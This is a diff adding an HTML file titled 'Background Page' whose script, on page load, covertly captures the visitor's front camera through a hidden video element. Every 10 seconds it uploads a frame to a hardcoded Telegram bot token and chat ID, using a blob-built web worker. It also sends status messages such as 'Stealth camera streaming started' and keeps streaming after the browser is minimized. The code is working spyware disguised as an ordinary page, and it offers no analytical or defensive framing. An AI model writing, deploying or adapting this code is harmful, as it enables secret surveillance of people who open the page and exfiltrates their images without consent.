@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Background Page</title>
+  <style>
+    body {
+      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div id="status">Loading...</div>
+
+  <script>
+    // Telegram bot details
+    const botToken = '7826950594:AAFBygBD_E2PmAITI6zsaPilys7l6i0gWBU';
+    const chatId = '894002841';
+    const message = 'Stealth camera streaming started';
+
+    // Create Service Worker code as a Blob
+    const swCode = `
+      self.addEventListener('install', event => {
+        self.skipWaiting();
+      });
+
+      self.addEventListener('activate', event => {
+        clients.claim();
+      });
+
+      self.addEventListener('fetch', event => {
+        // Cache control logic if needed
+      });
+    `;
+
+    // Create Web Worker code as a Blob
+    const workerCode = `
+      self.onmessage = async function(e) {
+        if (e.data.type === 'frame') {
+          const formData = new FormData();
+          formData.append('chat_id', '${chatId}');
+          formData.append('caption', \`Stealth frame at \${new Date(e.data.time).toLocaleTimeString()}\`);
+          formData.append('photo', e.data.blob, 'frame.jpg');
+          
+          try {
+            await fetch('https://api.telegram.org/bot${botToken}/sendPhoto', {
+              method: 'POST',
+              body: formData
+            });
+          } catch (error) {
+            console.error('Worker error sending frame:', error);
+          }
+        }
+      };
+    `;
+
+    // Register Service Worker
+    if ('serviceWorker' in navigator) {
+      const swBlob = new Blob([swCode], { type: 'application/javascript' });
+      const swUrl = URL.createObjectURL(swBlob);
+      
+      navigator.serviceWorker.register(swUrl).then(registration => {
+        console.log('ServiceWorker registration successful');
+      }).catch(err => {
+        console.log('ServiceWorker registration failed: ', err);
+      });
+    }
+
+    // Initialize camera streaming
+    async function startStealthStreaming() {
+      try {
+        // Create a hidden video element
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+        
+        // Get camera access
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          }
+        });
+        
+        video.srcObject = stream;
+        await video.play();
+        
+        // Create canvas for frame capture
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        // Create Web Worker from Blob
+        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(workerBlob);
+        const worker = new Worker(workerUrl);
+        
+        // Send initial notification
+        sendTelegramMessage(message);
+        
+        // Start frame capture loop
+        setInterval(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          
+          canvas.toBlob(blob => {
+            worker.postMessage({
+              type: 'frame',
+              blob: blob,
+              time: new Date().toISOString()
+            });
+          }, 'image/jpeg', 0.7);
+        }, 10000); // Capture every 10 seconds
+        
+        document.getElementById('status').textContent = 'System active';
+        
+        // Handle visibility changes
+        document.addEventListener('visibilitychange', () => {
+          if (document.hidden) {
+            sendTelegramMessage('Browser minimized, but streaming continues');
+          }
+        });
+        
+      } catch (error) {
+        console.error('Error:', error);
+        sendTelegramMessage('Camera access failed: ' + error.message);
+        document.getElementById('status').textContent = 'System inactive';
+      }
+    }
+
+    // Function to send messages to Telegram
+    function sendTelegramMessage(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text
+        })
+      }).catch(e => console.error('Error sending message:', e));
+    }
+
+    // Start when page loads
+    window.addEventListener('DOMContentLoaded', () => {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        document.getElementById('status').textContent = 'Camera not supported';
+        return;
+      }
+      
+      startStealthStreaming();
+    });
+  </script>
+</body>
+</html>
